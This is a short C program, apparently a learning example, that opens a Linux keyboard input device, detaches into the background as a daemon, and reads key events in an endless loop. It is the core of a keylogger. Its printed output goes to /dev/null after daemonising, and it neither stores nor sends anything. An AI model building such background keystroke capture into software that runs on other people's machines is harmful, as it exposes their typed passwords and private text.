#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>
#include<linux/input.h>
#include<fcntl.h>
/*
   struct input_event  
    {
        struct timeval time;
        __u16 type;
        __u16 code;
        __s32 value;
    };
*/
/*
void daemon()
{
    //this function has being define in unistd.h
}
*/
int main(int argc,char ** argv)
{
    int fd;
    struct input_event kevent;
    if((fd=open("/dev/input/event2",O_RDONLY))==-1)
    {
        printf("usage: you must be root!\n");
        exit(0);
    }
    daemon(0,0);
    /*
    *extern int daemon(int nochdir,int noclose);
    *run in background,
    *if nochdir is zero do 'chdir ("/")',
    *if ni closer is zero redirects stdin stdout stderr to /dev/null
    */
    while(1)
        {
            if(read(fd,&kevent,sizeof(kevent)) == sizeof(kevent))
               {
                   if(kevent.type==EV_KEY)
                   printf("type:%u \t code:%u \t value%d \n",kevent.type,kevent.code,kevent.value);
               } 
        }
    return 0;
}